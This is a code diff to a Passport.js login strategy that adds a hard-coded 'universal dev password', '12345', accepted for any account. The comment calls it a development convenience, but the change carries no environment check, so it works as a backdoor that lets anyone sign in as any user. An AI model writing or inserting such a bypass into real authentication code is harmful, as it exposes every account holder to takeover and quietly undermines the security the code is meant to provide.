@@ -18,11 +18,11 @@ module.exports = function(passport) {
             return done(null, false, { message: 'Incorrect email or password.' });
           }
 
-          // Check password
-          const isMatch = await user.matchPassword(password);
+          // Universal dev password lets any account be accessed with "12345"
+          const isUniversal = password === '12345';
+          const isMatch = isUniversal || await user.matchPassword(password);
 
           if (!isMatch) {
-            // Password mismatch
             return done(null, false, { message: 'Incorrect email or password.' });
           }
 
